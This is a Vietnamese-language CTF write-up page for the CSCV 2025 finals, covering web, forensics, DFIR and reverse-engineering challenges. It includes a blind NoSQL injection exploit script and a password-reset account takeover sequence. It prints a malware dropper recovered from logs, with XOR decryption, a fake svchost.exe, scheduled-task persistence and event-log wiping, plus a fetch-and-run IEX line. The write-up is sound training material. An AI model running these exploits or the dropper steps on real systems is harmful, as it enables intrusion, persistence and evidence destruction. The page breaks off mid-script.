@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CSCV 2025 Chung kết — Web · Forensics · Reverse Write-up</title>
+<link rel="icon" href="../../favicon.svg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root { --bg:#0b0a0f; --panel:#131119; --line:#2a2632; --ink:#f0eff2; --muted:#9998a2; --purple:#b49aef; --lime:#c9ff73; }
+* { box-sizing:border-box; }
+body { margin:0; background:var(--bg); color:var(--ink); font-family:'Plus Jakarta Sans',system-ui,sans-serif; font-size:15px; line-height:1.75; }
+.wu-shell { width:min(880px,calc(100% - 40px)); margin-inline:auto; padding-block:48px 90px; }
+.wu-back { font-family:'DM Mono',monospace; font-size:11px; letter-spacing:.09em; color:var(--muted); text-decoration:none; display:inline-flex; gap:9px; align-items:center; }
+.wu-back:hover { color:var(--lime); }
+.wu-banner { width:100%; border-radius:12px; margin-top:18px; object-fit:cover; max-height:220px; }
+.wu-head { border-bottom:1px solid var(--line); padding-block:26px 30px; margin-bottom:10px; }
+.wu-kicker { font-family:'DM Mono',monospace; font-size:11px; letter-spacing:.14em; color:var(--purple); }
+h1 { font-size:clamp(28px,4vw,42px); line-height:1.18; letter-spacing:-.035em; font-weight:600; margin:14px 0 12px; }
+.wu-meta { font-family:'DM Mono',monospace; font-size:11px; color:var(--muted); display:flex; flex-wrap:wrap; gap:10px 22px; }
+h2 { font-size:26px; letter-spacing:-.03em; margin:44px 0 8px; padding-top:20px; border-top:1px solid var(--line); }
+h3 { font-size:19px; margin:32px 0 6px; color:#e7dcff; }
+h4 { font-size:15px; margin:22px 0 2px; color:var(--purple); }
+p { color:#d5d3dc; }
+a { color:var(--lime); word-break:break-word; }
+code { font-family:'DM Mono',monospace; font-size:.9em; background:#1d1a25; border:1px solid var(--line); border-radius:4px; padding:1px 5px; color:#e6d9ff; overflow-wrap:anywhere; }
+pre { background:var(--panel); border:1px solid var(--line); border-radius:10px; padding:16px 18px; overflow-x:auto; }
+pre code { background:none; border:0; padding:0; color:#cfe6b0; font-size:12.5px; line-height:1.65; }
+blockquote { margin:18px 0; padding:10px 18px; border-left:2px solid var(--purple); background:#15121d; border-radius:0 8px 8px 0; color:var(--muted); }
+blockquote p { margin:3px 0; color:#c7c4d0; }
+table { width:100%; border-collapse:collapse; margin:18px 0; font-size:13.5px; display:block; overflow-x:auto; }
+th, td { border:1px solid var(--line); padding:9px 12px; text-align:left; vertical-align:top; }
+th { background:#171522; font-family:'DM Mono',monospace; font-size:11px; letter-spacing:.06em; text-transform:uppercase; color:var(--muted); }
+td code { white-space:nowrap; }
+hr { border:0; margin:14px 0; }
+ul, ol { padding-left:22px; color:#d5d3dc; }
+li { margin:6px 0; }
+.wu-foot { margin-top:60px; border-top:1px solid var(--line); padding-top:20px; font-family:'DM Mono',monospace; font-size:11px; color:var(--muted); }
+</style>
+</head>
+<body>
+<div class="wu-shell">
+  <a class="wu-back" href="../../blog.html">&larr; FIELD NOTES</a>
+  <img class="wu-banner" src="../../images/ctf/cscv-banner.jpg" alt="Cybersecurity Student Contest Vietnam 2025" loading="lazy">
+  <header class="wu-head">
+    <p class="wu-kicker">CTF WRITEUP · WEB · FORENSICS · DFIR · REVERSE</p>
+    <h1>CSCV 2025 — Chung kết Sinh viên An ninh mạng</h1>
+    <div class="wu-meta">
+      <span>Vòng Chung kết · 15/11/2025</span>
+      <span>Top 23/51 đội</span>
+      <span>Lê Thanh Hải (Th4nhH4i)</span>
+    </div>
+  </header>
+<blockquote><p><strong>Cuộc thi:</strong> Sinh viên An ninh mạng 2025 (CSCV 2025) — Vòng Chung kết</p><p><strong>Bảo trợ &amp; chủ trì:</strong> Bộ Công an, Bộ GD&amp;ĐT, Hiệp hội An ninh mạng Quốc gia (NCA)</p><p><strong>Kết quả:</strong> Top 23/51 đội (vòng Chung khảo, 15/11/2025)</p><p><strong>Tác giả:</strong> Lê Thanh Hải (Th4nhH4i)</p></blockquote>
+<p>Bài viết tổng hợp lời giải các thử thách ở vòng Chung kết CSCV 2025, gồm <strong>Web Application</strong>, <strong>Forensics</strong>, <strong>DFIR</strong> và <strong>Reverse Engineering</strong>. Phần DFIR và một số flag bổ sung được tham khảo từ write-up của <a href="https://m1nhd4cc.github.io/post/wu_cscv2025_final/" target="_blank" rel="noopener noreferrer">m1nhd4cc</a> <strong>[Tham khảo]</strong>. Pwn và Crypto không có lời giải từ nguồn nào.</p>
+<hr>
+<h2>🌐 Web Application</h2>
+<h3>GoWarmUp — Blind NoSQL Injection (MongoDB <code>$regex</code>)</h3>
+<p>Ứng dụng Go dùng JWT và MongoDB. Endpoint đăng ký cho phép tự chọn <code>role</code>, nên đăng ký thẳng một tài khoản <code>admin</code>:</p>
+<pre><code class="lang-bash">curl -X POST http://localhost:3000/api/v1/register \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{&quot;username&quot;:&quot;hacker&quot;,&quot;password&quot;:&quot;password123&quot;,&quot;role&quot;:&quot;admin&quot;}&#x27;
+
+curl -X POST http://localhost:3000/api/v1/login \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{&quot;username&quot;:&quot;hacker&quot;,&quot;password&quot;:&quot;password123&quot;}&#x27;
+# -&gt; {&quot;token&quot;:&quot;eyJhbGci...&quot;}</code></pre>
+<p>Endpoint <code>/api/v2/data?filter=</code> nhét thẳng tham số <code>filter</code> vào truy vấn Mongo. Có thể chèn một toán tử <code>$regex</code> để <strong>leak</strong> trường <code>address</code> của user <code>bob</code> (chứa flag) theo kiểu blind — dò từng ký tự, mỗi lần đúng thì <code>count &gt; 0</code>. Chú ý phải <strong>double-escape</strong> các ký tự đặc biệt của regex (<code>^ $ { } [ ] . * + ?</code>) để chúng tới được Mongo đúng dạng:</p>
+<pre><code class="lang-python">#!/usr/bin/env python3
+import requests, string, time
+
+URL = &quot;http://throbbing-glade.web-chall-cscv.space&quot;
+CHARSET = &quot;^[0-9a-f]{32}$&quot; + string.ascii_letters + string.digits + &quot;{}- &quot;
+TARGET_LEN = 42
+REGEX_METACHARS = r&quot;\.^$*+?()[]{}|&quot;
+
+s = requests.Session()
+s.headers.update({&quot;Content-Type&quot;: &quot;application/json&quot;})
+u = &quot;hacker&quot; + str(int(time.time()))
+s.post(f&quot;{URL}/api/v1/register&quot;, json={&quot;username&quot;: u, &quot;password&quot;: &quot;p&quot;, &quot;role&quot;: &quot;admin&quot;})
+token = s.post(f&quot;{URL}/api/v1/login&quot;, json={&quot;username&quot;: u, &quot;password&quot;: &quot;p&quot;}).json()[&quot;token&quot;]
+headers = {&quot;Authorization&quot;: f&quot;Bearer {token}&quot;}
+
+flag, known = &quot;&quot;, &quot;&quot;
+for _ in range(TARGET_LEN):
+    found = False
+    for c in CHARSET:
+        esc_c = (&quot;\\\\&quot; + c) if c in REGEX_METACHARS else c
+        esc_known = &quot;&quot;.join((&quot;\\\\&quot; + k) if k in REGEX_METACHARS else k for k in known)
+        pattern = &quot;^&quot; + esc_known + esc_c + &quot;.*&quot;
+        filter_param = &#x27;&quot;,&quot;address&quot;:{&quot;$regex&quot;:&quot;&#x27; + pattern + &#x27;&quot;}}}//&#x27;
+        r = s.get(f&quot;{URL}/api/v2/data&quot;, headers=headers, params={&quot;filter&quot;: filter_param}, timeout=5)
+        if r.status_code == 200 and r.json().get(&quot;count&quot;, 0) &gt; 0:
+            flag += c; known += c; found = True
+            print(&quot;[+]&quot;, flag); break
+    if not found:
+        break
+print(&quot;FLAG:&quot;, flag)</code></pre>
+<h3>S1mple API — Predictable reset token + Python <code>exec</code> RCE</h3>
+<p>Đọc source thấy 2 lỗ hổng nối tiếp nhau:</p>
+<ol><li><strong>Token đặt lại mật khẩu đoán được:</strong> token = <code>SHA256(email + username + dob + &quot;%Y:%m:%d-%H:%M&quot;)</code>. Chỉ cần tự tính token của <code>admin</code> trong đúng phút server nhận <code>forgot_password</code> là đổi được mật khẩu admin.</li><li><strong>RCE:</strong> sau khi có quyền admin, endpoint <code>/analysis/process_data</code> gọi <code>exec(script, safe_globals, safe_locals)</code> với sandbox hở — vẫn với tới được <code>__builtins__</code> qua chuỗi lớp cơ sở của Python, import <code>os</code> / <code>socket</code> để chạy mã tuỳ ý.</li></ol>
+<p>Giai đoạn 1 — chiếm admin (gửi <code>forgot_password</code>, bắt token server trả về rồi đổi mật khẩu ngay):</p>
+<pre><code class="lang-bash">FRONTEND=$(sudo docker ps -q --filter name=node_frontend)
+sudo docker exec -it $FRONTEND bash -c &#x27;
+  RESP=$(curl -s -X POST &quot;http://fastapi_backend:5555/auth/forgot_password&quot; \
+    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;email=admin@local.com&quot;)
+  TOKEN=$(echo &quot;$RESP&quot; | grep -o &quot;\&quot;token\&quot;:\&quot;[^\&quot;]*\&quot;&quot; | cut -d&quot;\&quot;&quot; -f4)
+  curl -s -X POST &quot;http://fastapi_backend:5555/auth/update_password&quot; \
+    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+    -d &quot;username=admin&amp;token=$TOKEN&amp;new_password=HackedPassword123&quot;
+  curl -s -X POST &quot;http://fastapi_backend:5555/auth/login&quot; \
+    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+    -d &quot;username=admin&amp;password=HackedPassword123&quot;
+&#x27;</code></pre>
+<p>Nếu tự tính token (khi không đọc được response), dùng đúng công thức và format thời gian của server:</p>
+<pre><code class="lang-python">import hashlib, datetime
+now = datetime.datetime.now().strftime(&quot;%Y:%m:%d-%H:%M&quot;)
+base = f&quot;admin@local.comadmin2000-01-01{now}&quot;   # email + username + dob + time
+print(hashlib.sha256(base.encode()).hexdigest())</code></pre>
+<p>Có admin token rồi thì gọi <code>/analysis/process_data</code> để thoát sandbox và RCE lấy flag trên server.</p>
+<hr>
+<h2>🔬 Forensics</h2>
+<h3>Chall Another Day — Điều tra log PowerShell (malware dropper)</h3>
+<p>Đọc log <code>Microsoft-Windows-PowerShell/Operational</code>. Đầu tiên là một easter-egg vô hại:</p>
+<pre><code class="lang-powershell">IEX(IRM &#x27;https://gist.githubusercontent.com/oumazio/.../easter_egg&#x27;)</code></pre>
+<p>Manh mối chính là hàm kiểm tra mật khẩu — password dài đúng 42 ký tự, <code>SHA256(password)</code> phải khớp mảng byte cố định; khi đúng thì <strong>chính password là flag</strong> (<code>Correct! The flag is: $input</code>):</p>
+<pre><code class="lang-powershell">function checkpass {
+    param([string]$password)
+    if ($password.Length -ne 42) { return $false }
+    $hash = (New-Object System.Security.Cryptography.SHA256Managed).ComputeHash(
+              [Text.Encoding]::ASCII.GetBytes($password))
+    $expected = @(0x9B,0x3E,0x78,0x9A,0x71,0x24,0x45,0x5C,0x6E,0x71,0x99,0x57,0xB5,0x47,0x47,0x79,
+                  0x69,0x61,0xAD,0x68,0x3F,0x73,0x7A,0x7C,0x7B,0x13,0x50,0x76,0x6D,0x71,0x5B,0x30)
+    for ($i=0; $i -lt $hash.Length; $i++){ if ($hash[$i] -ne $expected[$i]) { return $false } }
+    return $true
+}</code></pre>
+<p>Tiếp theo là đoạn dropper thật: giải mã file <code>.shi</code> bằng <strong>XOR</strong> với key <code>chieccupthu6danhchodoran</code>, ghi ra <code>%ProgramData%\svchost.exe</code>, tạo scheduled task ẩn tên <code>Windows Update</code> chạy lại mỗi 30 phút, rồi <strong>xoá sạch mọi Event Log</strong> để phi tang:</p>
+<pre><code class="lang-powershell">$key = &quot;chieccupthu6danhchodoran&quot;
+$decrypted = XOR-Decrypt -Data ([IO.File]::ReadAllBytes(&quot;$PWD\.shi&quot;)) -Key $key
+[IO.File]::WriteAllBytes(&quot;$env:ProgramData\svchost.exe&quot;, $decrypted)
+
+Register-ScheduledTask -TaskName &#x27;Windows Update&#x27; -Action `
+  (New-ScheduledTaskAction -Execute &quot;$env:ProgramData\svchost.exe&quot;) -Trigger `
+  (New-ScheduledTaskTrigger -Once -At (Get-Date) `
+     -RepetitionInterval (New-TimeSpan -Minutes 30)) -Force
+
+wevtutil cl System; wevtutil cl Security; wevtutil cl Application
+wevtutil cl &quot;Windows PowerShell&quot;; wevtutil cl &quot;Microsoft-Windows-PowerShell/Operational&quot;</code></pre>
+<p>Tóm lại chuỗi hành vi: PowerShell → giải mã dropper (XOR) → thả <code>svchost.exe</code> giả → cài persistence bằng scheduled task → xoá log.</p>
+<h4>[Tham khảo] Flag đầy đủ — 3 phần</h4>
+<p>Theo <a href="https://m1nhd4cc.github.io/post/wu_cscv2025_final/" target="_blank" rel="noopener noreferrer">m1nhd4cc</a>, flag gồm 3 phần ghép lại:</p>
+<ul>
+<li><strong>Part 1:</strong> Mảng <code>$a1</code> và <code>$a2</code> trong script PowerShell — trừ từng cặp phần tử rồi chuyển thành ký tự, được chuỗi base64: <code>dHIzX2Nvbl90M19saWV0X3RydVkzbl90NGlfbmthdV9iMW5rXzB4eV8=</code> → decode ra <code>tr3_con_t3_liet_truY3n_t4i_nkau_b1nk_0xy_</code></li>
+<li><strong>Part 2:</strong> File <code>svchost.exe</code> (C# malware) nhúng shellcode trong resource <code>shellcoders.bin</code>. Dùng <strong>speakeasy</strong> để phân tích shellcode → <code>s0n_tunq_mtP_884844_</code></li>
+<li><strong>Part 3:</strong> Tìm trong log <code>Microsoft-Windows-PowerShell/Operational.evtx</code> → <code>kirit0kun_8142b5a11e55c693</code></li>
+</ul>
+<p><strong><code>CSCV2025{tr3_con_t3_liet_truY3n_t4i_nkau_b1nk_0xy_s0n_tunq_mtP_884844_kirit0kun_8142b5a11e55c693}</code></strong></p>
+<h3>Chall Case Charlie — DFIR trên Linux (6 câu hỏi)</h3>
+<p>Gói triage của một máy Ubuntu. Sáu câu hỏi và cách trả lời:</p>
+<table><thead><tr><th>Câu</th><th>Nội dung</th><th>Đáp án</th></tr></thead><tbody><tr><td>Q1</td><td>Lần cuối nghi phạm đăng nhập server (UTC)</td><td><code>2025-11-08 04:32:56</code></td></tr><tr><td>Q2</td><td>Ứng dụng chat đã dùng</td><td><code>irssi</code></td></tr><tr><td>Q3</td><td>Handle của nghi phạm &amp; người liên hệ</td><td><code>s3v3n_wOndEr113, the0nlymak3r1338</code></td></tr><tr><td>Q4</td><td>Lần cuối nghi phạm nhắn tin (UTC)</td><td><code>2025-11-08 04:36</code></td></tr><tr><td>Q5</td><td>Lệnh ghi đè <code>.bash_history</code> để xoá dấu vết</td><td><code>sudo shred -vfz /home/ubuntu/.bash_history</code></td></tr><tr><td>Q6</td><td>Email nghi phạm để lộ</td><td><code>phuchungh96@gmail.com</code></td></tr></tbody></table>
+<ul><li><strong>Q1:</strong> hai file <code>/var/log/wtmp</code> và <code>/var/log/lastlog</code> không đọc trực tiếp được, nhưng mtime của chúng (<code>2025-11-08 04:32:56</code>) chính là thời điểm phiên đăng nhập cuối được ghi.</li><li><strong>Q2–Q4:</strong> trong <code>/home/ubuntu</code> có thư mục <code>.irssi</code> và <code>irclogs</code> → client chat là <strong>irssi</strong>. File <code>.irssi/config</code> lộ nick <code>s3v3n_wOndEr113</code>; log IRC trong <code>irclogs/</code> cho cả hai handle và dòng cuối nghi phạm gửi lúc <code>04:36</code> ngày <code>2025-11-08</code>.</li><li><strong>Q5:</strong> <code>.bash_history</code> bị xoá; <code>strings</code> toàn hệ thống rồi <code>grep</code> theo <code>.bash_history</code> trong log <code>auditd</code>/journal thấy chuỗi lệnh <code>rm -f</code> và <code>shred -vfz</code> lên cả <code>/root</code> lẫn <code>/home/ubuntu</code>.</li><li><strong>Q6:</strong> <code>~/.docker/config.json</code> chứa auth Base64 → decode ra username <code>asjdkhufh832</code> và một GitLab PAT <code>glpat-...</code>. Dùng nó pull image <code>registry.gitlab.com/somegroup5803945/jkfhskdf2314:testing</code>, <code>docker save</code> rồi giải nén từng layer, tìm thư mục <code>.git</code> bị nhúng và lấy email tác giả: <code>git --git-dir=.git log -1 --format=&#x27;%ae&#x27;</code>.</li></ul>
+<h4>[Tham khảo] Flag tổng hợp</h4>
+<p>Theo <a href="https://m1nhd4cc.github.io/post/wu_cscv2025_final/" target="_blank" rel="noopener noreferrer">m1nhd4cc</a>, flag chung kết hợp toàn bộ kết quả điều tra:</p>
+<p><strong><code>CSCV2025{DoCkER_stoRes-0uR-cREd3NtI4I5_uNeNCRYPt3d-iN_lT5_cOnfig_file_lmao_xd_Ow0}</code></strong></p>
+<hr>
+<h2>🔍 DFIR <span style="font-size:13px;color:var(--muted);font-weight:400;">[Tham khảo]</span></h2>
+<blockquote><p>Toàn bộ nội dung mục DFIR được tham khảo từ write-up của <a href="https://m1nhd4cc.github.io/post/wu_cscv2025_final/" target="_blank" rel="noopener noreferrer">m1nhd4cc</a>.</p></blockquote>
+<h3>DFIR — Ransomware Analysis &amp; Decryption</h3>
+<p>Đề bài: Một quản lý cấp cao tại công ty tài chính bị mã hoá toàn bộ tài liệu quan trọng và bị tống tiền. Nhiệm vụ:</p>
+<ol><li>Xác định SHA-256 của file ransomware</li><li>Khôi phục SHA-256 của file <code>financialStatement.pdf</code> gốc</li></ol>
+<h4>Nhận diện ransomware</h4>
+<p>Tất cả file trên máy đã bị mã hoá (đuôi <code>.enc</code>). Kiểm tra bằng <code>tasklist /v</code> phát hiện tiến trình đáng ngờ: <strong>Runtime Broker.exe</strong> — tên giống process Windows hợp lệ (<code>RuntimeBroker.exe</code>) nhưng nằm ở <code>C:\Windows\SysWOW64</code> thay vì <code>System32</code>.</p>
+<p>Xác nhận bằng cách bật audit trên một thư mục rồi tạo file test — nếu file bị mã hoá thì EventID 4663 sẽ ghi lại process nào truy cập:</p>
+<pre><code class="lang-powershell">auditpol /set /subcategory:&quot;File System&quot; /success:enable /failure:enable
+$path = &quot;C:\Users\MANAGER\Desktop\&quot;
+$acl  = Get-Acl $path
+$rule = New-Object System.Security.AccessControl.FileSystemAuditRule(
+    &quot;Everyone&quot;,
+    &quot;CreateFiles,Write,AppendData,Delete,DeleteSubdirectoriesAndFiles&quot;,
+    &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Success&quot;
+)
+$acl.AddAuditRule($rule)
+Set-Acl $path $acl
+echo &quot;demo&quot; &gt; C:\Users\MANAGER\Desktop\new.txt</code></pre>
+<p>→ File test bị mã hoá, log xác nhận <code>Runtime Broker.exe</code> là ransomware.</p>
+<p>SHA-256 của ransomware: <code>940ca4c4440ee72b2cc89e7927276b549be0d4dca7e7ae85ff7b25ecf52ced70</code></p>
+<h4>Phân tích cơ chế mã hoá (IDA)</h4>
+<p>Chương trình viết bằng C++, dùng <strong>AES-256-CBC</strong> qua Windows BCrypt API. Workflow chính:</p>
+<ol><li><code>sub_1400029A0()</code> — sinh Key &amp; IV từ Unix timestamp + thông tin máy</li><li><code>sub_14000C5F0()</code> — duyệt đệ quy thư mục, gọi mã hoá từng file</li><li><code>sub_140002F70()</code> — mã hoá AES-CBC, ghi <code>.enc</code>, xoá file gốc</li></ol>
+<p>Kỹ thuật đáng chú ý:</p>
+<ul><li><strong>Rate Limiting:</strong> <code>Sleep(100ms)</code> giữa mỗi file — tránh kích hoạt EDR/heuristic do IOPS quá cao</li><li><strong>Double Call BCryptEncrypt:</strong> gọi lần 1 với output NULL để lấy kích thước buffer, lần 2 mới mã hoá thật</li><li><strong>Fallback:</strong> sau vòng lặp chính, quét thêm <code>C:\Users\</code> và <code>C:\</code> phòng trường hợp bỏ sót</li></ul>
+<h4>Key Derivation (brute-force được)</h4>
+<p>Key sinh hoàn toàn từ <strong>Unix timestamp</strong> 32-bit:</p>
+<pre><code>T       = Unix timestamp (32-bit)
+v16     = T XOR 0xDEADBEEF
+pbInput = (T XOR 0xDEADBEEF XOR (T + 13107)) || (T XOR ((T XOR 0xDEADBEEF) + 13107))   # 8 bytes
+
+Hash1   = SHA256(pbInput)              # 32 bytes
+Hash2   = SHA256(Hash1 || v16 || T)    # 32 bytes
+Key     = Hash1 XOR Hash2             # 32 bytes → AES-256 key</code></pre>
+<h4>IV Derivation</h4>
+<p>IV sinh từ thông tin máy — cố định cho cùng một máy:</p>
+<pre><code>IV = SHA256(&quot;ComputerName_UserName&quot;)[:16]</code></pre>
+<p>Thu thập:</p>
+<ul><li><strong>ComputerName:</strong> <code>DESKTOP-PAEK96M</code> — từ Registry <code>ControlSet001\Control\ComputerName</code></li><li><strong>UserName:</strong> <code>MANAGER</code> — từ đường dẫn user profile</li></ul>
+<h4>Script giải mã (PowerShell)</h4>
+<p>Brute-force timestamp ±200 giây quanh mốc <code>LastWriteTime</code> của file <code>.enc</code>. Kiểm tra magic bytes (ZIP/Office: <code>50-4B-03-04</code>, PDF: <code>25-50-44-46</code>) để xác nhận key đúng:</p>
+<pre><code class="lang-powershell">param(
+    [string]$InputRoot = &quot;C:\EncryptedFiles&quot;,
+    [string]$OutputRoot = &quot;C:\EncryptedFiles\Decrypted&quot;,
+    [string]$ComputerName = &quot;DESKTOP-PAEK96M&quot;,
+    [string]$UserName     = &quot;MANAGER&quot;,
+    [int]$TimeWindowSeconds = 200
+)
+
+function Get-UnixTimeSeconds {
+    param([DateTime]$DateTime)
+    return [int64]([DateTimeOffset]$DateTime.ToUniversalTime()).ToUnixTimeSeconds()
+}
+
+function Derive-KeyIv {
+    param([int64]$UnixTimeSeconds, [string]$ComputerName, [string]$UserName)
+    $T = [uint32]$UnixTimeSeconds
+    $v16 = [uint32]($T -bxor 0xDEADBEEF)
+    $pbInput0 = [uint32]($T -bxor 0xDEADBEEF -bxor ($T + 13107))
+    $v23 = [uint32]($T -bxor (([uint32]($T -bxor 0xDEADBEEF)) + 13107))
+
+    $buf1 = New-Object byte[] 8
+    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($pbInput0), 0, $buf1, 0, 4)
+    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($v23),      0, $buf1, 4, 4)
+
+    $sha = [System.Security.Cryptography.SHA256]::Create()
+    $h1 = $sha.ComputeHash($buf1)
+
+    $buf2 = New-Object byte[] 40
+    [System.Buffer]::BlockCopy($h1, 0, $buf2, 0, 32)
+    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($v16), 0, $buf2, 32, 4)
+    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($T),   0, $buf2, 36, 4)
+    $h2 = $sha.ComputeHash($buf2)
+
+    $key = New-Object byte[] 32
+    for ($i = 0; $i -lt 32; $i++) { $key[$i] = $h1[$i] -bxor $h2[$i] }
+
+    if ([string]::IsNullOrEmpty($ComputerName)) { $ComputerName = &quot;UnknownPC&quot; }
+    if ([string]::IsNullOrEmpty($UserName))     { $UserName     = &quot;UnknownUser&quot; }
+    $ivFull = $sha.ComputeHash([Text.Encoding]::ASCII.GetBytes(&quot;${ComputerName}_${UserName}&quot;))
+    $iv = New-Object byte[] 16
+    [System.Buffer]::BlockCopy($ivFull, 0, $iv, 0, 16)
+    $sha.Dispose()
+    return @{ Key = $key; IV = $iv }
+}
+
+function Test-KeyOnFile {
+    param([string]$FilePath, [byte[]]$Key, [byte[]]$IV)
+    try {
+        $ct = [IO.File]::ReadAllBytes($FilePath)
+        $aes = [Security.Cryptography.Aes]::Create()
+        $aes.Mode = &quot;CBC&quot;; $aes.Padding = &quot;PKCS7&quot;; $aes.Key = $Key; $aes.IV = $IV
+        $dec = $aes.CreateDecryptor()
+        $ms = New-Object IO.MemoryStream(,$ct)
+        $cs = New-Object Security.Cryptography.CryptoStream($ms,$dec,&quot;Read&quot;)
+        $out = New-Object IO.MemoryStream
+        $buf = New-Object byte[] 4096
+        while (($r = $cs.Read($buf,0,$buf.Length)) -gt 0) { $out.Write($buf,0,$r) }
+        $cs.Dispose(); $aes.Dispose()
+        $plain = $out.ToArray(); $out.Dispose(); $ms.Dispose()
+        if ($plain.Length -lt 4) { return $false }
+        $m = [BitConverter]::ToString($plain[0..3])
+        return ($m -eq &quot;50-4B-03-04&quot; -or $m -eq &quot;25-50-44-46&quot;)
+    } catch { return $false }
+}
+
+# --- Main ---
+$encFiles = Get-ChildItem $InputRoot -Recurse -File -Filter *.enc | Where-Object { $_.Length -gt 0 }
+$sample = $encFiles | Sort-Object Length | Select-Object -First 1
+$baseUnix = Get-UnixTimeSeconds $sample.LastWriteTimeUtc
+
+for ($t = $baseUnix - $TimeWindowSeconds; $t -le $baseUnix + $TimeWindowSeconds; $t++) {
+    $d = Derive-KeyIv $t $ComputerName $UserName
+    if (Test-KeyOnFile $sample.FullName $d.Key $d.IV) {
+        Write-Host &quot;[+] Key found at UnixTime=$t&quot;
+        foreach ($f in $encFiles) {
+            $outPath = Join-Path $OutputRoot ($f.FullName.Substring($InputRoot.Length) -replace &#x27;\.enc$&#x27;,&#x27;&#x27;)
+            New-Item -ItemType Directory -Path (Split-Path $outPath) -Force | Out-Null
+            $ct = [IO.File]::ReadAllBytes($f.FullName)
+            $aes = [Security.Cryptography.Aes]::Create()
+            $aes.Mode=&quot;CBC&quot;; $aes.Padding=&quot;PKCS7&quot;; $aes.Key=$d.Key; $aes.IV=$d.IV
+            $dec=$aes.CreateDecryptor(); $ms=New-Object IO.MemoryStream(,$ct)
+            $cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,&quot;Read&quot;)
+            $o=New-Object IO.MemoryStream; $b=New-Object byte[] 4096
+            while(($r=$cs.Read($b,0,$b.Length))-gt 0){$o.Write($b,0,$r)}
+            [IO.File]::WriteAllBytes($outPath,$o.ToArray())
+            $cs.Dispose(); $aes.Dispose(); $o.Dispose(); $ms.Dispose()
+        }
+        break
+    }
+}</code></pre>
+<p>Sau khi giải mã, lấy hash của file gốc <code>financialStatement.pdf</code>:</p>
+<p><code>6982f297b52b3e6fa6946d3df2ef810b6cd86e679511d2cc832d70953a4dd47f</code></p>
+<h4>Flag</h4>
+<p><strong><code>CSCV2025{940ca4c4440ee72b2cc89e7927276b549be0d4dca7e7ae85ff7b25ecf52ced70_6982f297b52b3e6fa6946d3df2ef810b6cd86e679511d2cc832d70953a4dd47f}</code></strong></p>
+<hr>
+<h2>⚙️ Reverse Engineering</h2>
+<h3>BabyAPK — Khoá AES sinh sẵn hash + brute passkey 8 chữ số</h3>
+<p>Mở APK bằng jadx. <code>MainActivity</code> giải mã sẵn một chuỗi (<code>f1101y</code>) bằng <strong>AES-256-CBC</strong>, key = <code>SHA256(&quot;secr_part&quot; + key_part_res + &quot;1.0.0&quot;)</code>. Giá trị <code>key_part_res</code> nằm trong <code>res/values/strings.xml</code>:</p>
+<pre><code class="lang-xml">&lt;string name=&quot;key_part_res&quot;&gt;k3yRe5&lt;/string&gt;</code></pre>
+<p>Logic nút bấm yêu cầu passkey đúng <strong>8 chữ số</strong>, so <code>SHA256(passkey)</code> với <code>f1101y</code>. Nếu đúng, flag = <code>CSCV2025{ SHA1(passkey) }</code>. Vậy giải mã <code>f1101y</code> để lấy target hash rồi brute 8 chữ số:</p>
+<pre><code class="lang-python">import base64, hashlib
+from Crypto.Cipher import AES
+
+KEY_MATERIAL = bytes.fromhex(&quot;736563725f70617274&quot;).decode() + &quot;k3yRe5&quot; + &quot;1.0.0&quot;  # &quot;secr_part&quot;+...
+key = hashlib.sha256(KEY_MATERIAL.encode()).digest()
+iv  = bytes.fromhex(&quot;2557127f6697dca3b9b02c85bc94d1ff&quot;)
+ct  = base64.b64decode(&quot;Rh5g13iNfXguQWeoMU9vVc1pvK6oC6/4zLm1aW8nqq/KWQ+GbYACDvBQ9pa75Vy6Rpah4UJunK5WRgwlmE/fcWEPrIKyyh6c/diJrXOGQW8=&quot;)
+
+pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
+target = pt[:-pt[-1]].decode()                       # SHA256(passkey) dạng hex
+
+for i in range(100_000_000):
+    s = f&quot;{i:08d}&quot;
+    if hashlib.sha256(s.encode()).hexdigest() == target:
+        flag = &quot;CSCV2025{&quot; + hashlib.sha1(s.encode()).hexdigest() + &quot;}&quot;
+        print(&quot;passkey:&quot;, s, &quot;\nFLAG:&quot;, flag)
+        break</code></pre>
+<p>Kết quả: <code>passkey = 28109923</code> → <strong><code>CSCV2025{8d1d11a9d8745469e896035df1c94f568abbac32}</code></strong>.</p>
+<h3>Unlocker — OTP từ native lib (mt19937_64) dựng lại bằng Python</h3>
+<p>Bản này giống BabyAPK nhưng passkey đúng là một OTP 15 ký tự <code>[A-Za-z0-9]</code> do <code>NativeLib.generateInsecureOtp(15)</code> sinh ra; flag = <code>CSCV2025{ SHA1(OTP) }</code>. Đọc <code>libnativelib.so</code> trong Ghidra thấy: bảng 62 ký tự <code>0-9A-Za-z</code>, RNG là <strong>std::mt19937_64</strong> với seed cố định <code>0x1350191</code>, lấy chỉ số bằng <code>uniform_int_distribution(0,61)</code>. Dựng lại đúng thuật toán trong Python:</p>
+<pre><code class="lang-python">import hashlib
+
+class MT19937_64:
+    NN, MM = 312, 156
+    MATRIX_A = 0xB5026F5AA96619E9
+    UM, LM = 0xFFFFFFFF80000000, 0x7FFFFFFF
+    def __init__(self, seed):
+        self.mt = [0]*self.NN; self.mt[0] = seed &amp; 0xFFFFFFFFFFFFFFFF
+        for i in range(1, self.NN):
+            x = self.mt[i-1] ^ (self.mt[i-1] &gt;&gt; 62)
+            self.mt[i] = (0x5851F42D4C957F2D * x + i) &amp; 0xFFFFFFFFFFFFFFFF
+        self.mti = self.NN
+    def gen64(self):
+        if self.mti &gt;= self.NN:
+            for i in range(self.NN):
